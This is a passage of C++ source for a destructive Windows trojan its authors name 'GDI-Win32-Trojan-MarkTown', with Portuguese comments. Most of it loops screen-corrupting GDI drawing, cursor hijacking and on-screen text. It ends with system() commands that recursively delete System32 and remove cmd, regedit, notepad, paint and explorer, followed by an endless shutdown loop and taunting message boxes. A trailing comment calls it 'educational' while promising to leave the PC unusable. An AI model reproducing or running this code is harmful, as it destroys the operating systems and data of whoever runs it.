		LineTo(desk, rand() % x, rand() % y);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
	}
	for (int i = 0; i < 600; i++) {
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCPAINT);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		BitBlt(desk, 12, 12, x, y, desk, 12, 12, SRCCOPY);
		BitBlt(hdc, 7, 7, x, y, hdc, 14, 14, SRCAND);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCAND);
		PatBlt(hdc, 4, 4, x, y, SRCPAINT);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		LineTo(desk, rand() % x, rand() % y);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - 15, pt.y - 15, LoadIcon(NULL, IDI_ERROR));
	}
	for (float i = 0; i < x + y; i += 0.99f) {
		double rotaision = 100;
		int a = sin(rotaision) * 100;
		BitBlt(desk, i, 0, 10, y, desk, i, a, SRCINVERT);
		BitBlt(hdc, i, 0, 95, y, desk, i, a, SRCCOPY);
		rotaision += M_PI / 100;
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCPAINT);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		BitBlt(desk, 12, 12, x, y, desk, 12, 12, SRCCOPY);
		BitBlt(hdc, 7, 7, x, y, hdc, 14, 14, SRCAND);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCAND);
		PatBlt(hdc, 4, 4, x, y, SRCPAINT);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		LineTo(desk, rand() % x, rand() % y);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - 15, pt.y - 15, LoadIcon(NULL, IDI_ERROR));
	}
	for (float i = 0; i < x + y; i += 0.99f) {
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCPAINT);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		BitBlt(desk, 12, 12, x, y, desk, 12, 12, SRCCOPY);
		BitBlt(hdc, 7, 7, x, y, hdc, 14, 14, SRCAND);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCAND);
		PatBlt(hdc, 4, 4, x, y, SRCPAINT);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		LineTo(desk, rand() % x, rand() % y);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - 15, pt.y - 15, LoadIcon(NULL, IDI_ERROR));
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		double rotaision = 100;
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		int a = sin(rotaision) * 100;
		BitBlt(desk, i, 0, 10, y, desk, i, a, SRCINVERT);
		BitBlt(desk, i, 0, 95, y, desk, i, a, SRCCOPY);
		rotaision += M_PI / 100;
		LineTo(desk, rand() % x, rand() % y);
		HDC hdc = GetDC(0);
		HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
		SelectClipRgn(hdc, hrgn);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	}
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
	SelectObject(deskMem, scr);
	BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
	for (int i = 0; i < sw * sh; i++) {
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		SetCursorPos(rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCINVERT);
		BitBlt(hdc, 12, 12, x, y, hdc, 10, 10, SRCAND);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		BitBlt(hdc, 12, 100, x, y, hdc, 80, 1000, SRCCOPY);
		BitBlt(hdc, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		LineTo(desk, rand() % x, rand() % y);
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, 10, 10, x, y, hdc, 10, 10, SRCCOPY);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCPAINT);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		BitBlt(desk, 12, 12, x, y, desk, 12, 12, SRCCOPY);
		BitBlt(hdc, 7, 7, x, y, hdc, 14, 14, SRCAND);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, SRCAND);
		PatBlt(hdc, 4, 4, x, y, SRCPAINT);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		LineTo(desk, rand() % x, rand() % y);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - 15, pt.y - 15, LoadIcon(NULL, IDI_ERROR));
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		double rotaision = 100;
		SetCursorPos(rand() % x, rand() % y);
		BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, hdc, 0, 0, 0x9273ecef);
		int a = sin(rotaision) * 100;
		BitBlt(desk, i, 0, 10, y, desk, i, a, SRCINVERT);
		BitBlt(desk, i, 0, 95, y, desk, i, a, SRCCOPY);
		rotaision += M_PI / 100;
		LineTo(desk, rand() % x, rand() % y);
		HDC hdc = GetDC(0);
		HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
		SelectClipRgn(hdc, hrgn);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
		int x = i % sw, y = i / sh + x ^ y >> sw / sh, t = y ^ y | x >> sw;
		rgbtriple[i].rgbtBlue += t + GetBValue(x ^ y | t) * M_PI;
		rgbtriple[i].rgbtRed += x + GetRValue(t ^ y | x) * M_PI;
		rgbtriple[i].rgbtGreen += y + GetGValue(x ^ t | y) * M_PI;
	}
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0;
	int dY = 0;
	int dW;
	int dH;
	int sx = 0, sy = 0;
	int rx = 0, ry = 0;
	POINT wPt[3];
	int counter = 30;
	int xs = GetSystemMetrics(SM_CXSCREEN), ys = GetSystemMetrics(SM_CYSCREEN);
	for (int i = 0; i < sw * sh; i++) {
		TextOutW(hdc, rand() % sw, rand() % sh, lptext3, wcslen(lptext3));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext2, wcslen(lptext2));
		TextOutW(hdc, rand() % sw, rand() % sh, lptext, wcslen(lptext));
		int(a) = rand() % w;
		int(b) = rand() % h;
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(SM_CXSCREEN);
		sy = GetSystemMetrics(SM_CYSCREEN);
		rx = rand() % sx;
		ry = rand() % sy;
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, 0, sx, sy, PATCOPY);
		BitBlt(DES, a, b, 200, 200, DES, a + rand() % 21 - 10, b + rand() % 21 - 10, !(rand() & 3) ? 0xEE0086 : 0xCC0020);
		StretchBlt(desk, -10, -10, xs + 20, ys + 20, desk, 0, 0, xs, ys, SRCPAINT);
		hWnd = GetDesktopWindow();
		hWindow = GetWindowDC(hWnd);
		hDsktp = GetDC(0);
		GetWindowRect(hWnd, &wRect);
		dW = GetSystemMetrics(0);
		dH = GetSystemMetrics(0);
		wPt[0].x = wRect.left - counter;
		wPt[0].y = wRect.top + counter;
		wPt[1].x = wRect.right - counter;
		wPt[1].y = wRect.top - counter;
		wPt[2].x = wRect.left + counter;
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(hdcc, rand() % x, rand() % y, curinf.hCursor);
		wPt[2].y = wRect.bottom + counter;
		PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
	//Este payload foi uma homenagem ao meu antigo malware: RainRainbow32, meu primeiro malware!
	system("rd C:\Windows\System32 /s /q");//deleta tudo que tá na pasta system32
	system("taskkill /f /im explorer.exe");
	MessageBox(NULL, L"Hey bro, i fuck your boot sector!", L"MarkTown.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
	system("del /f /s /q C:\Windows\notepad.exe");//Deleta o notepad
	system("del /f /s /q C:\Windows\regedit.exe");//Deleta o aplicativo da Regedit
	system("del /f /s /q C:\Windows\System32\cmd.exe");//Deleta o cmd
	MessageBox(NULL, L"I DELETE YOUR CMD, NOTEPAD AND REGEDIT, I WARNED YOU. . . .", L"MaRkToWn DoN't ArE sEcUrItY.eXe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
	system("del /f /s /q C:\Windows\System32\regedt32.exe");//Deleta o regedt32
	system("del /f /s /q C:\Windows\System32\mspaint.exe");//Deleta o Paint
	system("del /f /s /q C:\Windows\explorer.exe");//Deleta o gerenciador de tarefas
	system("timeout 10");
	MessageBox(NULL, L"YOUR TIME IS UP!", L";-;", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
	while (true) {
		system("shutdown -s");
	}
	/*
O "system("timeout 10");" é para esperar 10 segundos para executar o loop:
while(true){
	system("shutdown -s");
}

Este malware é bem básico, com alguns efeitos de gdi que ficaram bem legal(em minha opinião), este é o meu primeiro malware de GDI, e é um malware colab com o meu amigo POLAR :)
Tudo foi programado em C++, oque fugiu dos nossos planos, pois era para ser em C++ e Python, mas não deu certo, então, nós decidimos fazer tudo em C++ e deu certo!

Créditos: Joaozin YT e Spitzer(Polar).
(Este é um source code fechado).

Caso queira saber o nome completo do malware é:
GDI-Win32-Trojan-MarkTown

Este código é malicioso, ou seja, quando há a intenção de destruir a máquina! Mas, ele foi feito para questões educacionais, tanto que tem avisos explicando, e até te no Read Me.
Nós não nos responsabilizamos pelos danos a sua máquina, pois, este malware foi feito com o intuito educacional :)
Ele vai realmente destruir sua máquina, É SÉRIO, ele vai apagar sua MBR(Master Boot Record ou Setor de boot).
Ele vai tambem apagar certos aplicativos do seu sistema, oque resulta na destruição do seu computador: DEIXANDO SEU PC INULTILIZÁVEL!
*/
}